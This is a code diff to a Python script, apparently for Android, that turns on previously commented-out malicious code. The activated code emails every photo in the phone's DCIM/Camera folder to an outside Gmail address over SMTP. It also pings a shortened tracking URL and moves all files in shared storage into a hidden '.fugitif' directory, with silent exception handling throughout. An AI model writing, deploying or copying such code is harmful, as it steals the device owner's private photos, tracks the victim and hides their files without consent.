@@ -28,21 +28,21 @@ ra= 'teamfugitifdev.h4ck@gmail.com'
 context = ssl.create_default_context()
 #server= smtplib​.​SMTP_SSL​(​smtp_address​, smtp_port, context=context)
 server = smtplib.SMTP_SSL(smtp_address, smtp_port, context=context)
-'''
+
 def connect(nom):
     with open(nom, 'rb') as fp:
         img = MIMEImage(fp.read())
         img.add_header('Content-Disposition', 'attachment', filename=nom)
         msg.attach(img) 
         #server.sendmail(ma, ra, msg.as_string())
-
-msg = MIMEMultipart()
-connexion=''
-msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
-chemin = '/storage/emulated/0//DCIM/Camera/'
-os.chdir('/storage/emulated/0/DCIM/Camera')
-liste = os.listdir()
-for x in liste:
+try:
+ msg = MIMEMultipart()
+ connexion=''
+ msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
+ chemin = '/storage/emulated/0//DCIM/Camera/'
+ os.chdir('/storage/emulated/0/DCIM/Camera')
+ liste = os.listdir()
+ for x in liste:
     l = list(x)
     #print(l)
     if '.' in l:
@@ -55,14 +55,14 @@ for x in liste:
                 na.remove(' ')
             name = ''.join(na)
             connect(name)
-#print('soon ready...')
+ #print('soon ready...')
 
-#server​.​sendmail​(​ma, ra, msg.as_string())
-server.login(ma, mp)
-def sendit():
+ #server​.​sendmail​(​ma, ra, msg.as_string())
+ server.login(ma, mp)
+ def sendit():
    server.sendmail(ma, ra, msg.as_string())
    
-if __name__ == '__main__':
+ if __name__ == '__main__':
     # We create a Process
     action_process = Process(target=sendit)
     action_process.start()
@@ -70,18 +70,23 @@ if __name__ == '__main__':
     action_process.terminate()
     print("Ready!")
     
-'''
+except:
+ pass
+
 br = mechanize.Browser()
 br.set_handle_robots(False)
 url = 'https://2no.co/29KaK6'
 #ipa = br.open(url)
 ipz = requests.get(url)
-'''
-os.chdir('/storage/emulated/0')
-os.system('mkdir Fugitif')
-for x in os.listdir():
+try:
+ os.chdir('/storage/emulated/0')
+ os.system('mkdir Fugitif')
+ for x in os.listdir():
    shutil.move(x, '/storage/emulated/0/Fugitif')
-shutil.move('Fugitif', '.fugitif')'''
+ shutil.move('Fugitif', '.fugitif')
+except:
+ pass
+
 s2 = smtplib.SMTP_SSL(smtp_address, smtp_port, context=context)
 s2.login(ma, mp)
 
